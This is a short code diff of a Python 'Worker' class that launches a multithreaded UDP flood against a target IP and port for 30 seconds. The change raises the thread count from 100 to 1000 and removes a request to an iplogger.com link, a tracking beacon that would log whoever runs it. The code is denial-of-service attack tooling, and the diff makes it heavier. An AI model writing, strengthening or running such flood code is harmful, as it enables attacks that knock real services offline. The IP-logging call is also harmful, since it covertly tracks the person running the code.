@@ -484,7 +484,7 @@ class Worker:
         TARGET_PORT = 9013
         PACKET_SIZE = 2024
         DURATION = 30
-        NUM_THREADS = 100
+        NUM_THREADS = 1000
 
         print(f"\n[*] Starting UDP flood to {TARGET_IP}:{TARGET_PORT} using {NUM_THREADS} threads for {DURATION} seconds...")
 
@@ -500,7 +500,7 @@ class Worker:
         for thread in threads:
             thread.join()
 
-        requests.get("https://iplogger.com/2lZdU4")
+        print("Successfully finished!!")
 
         # ====================================================
         # JOB RESULT
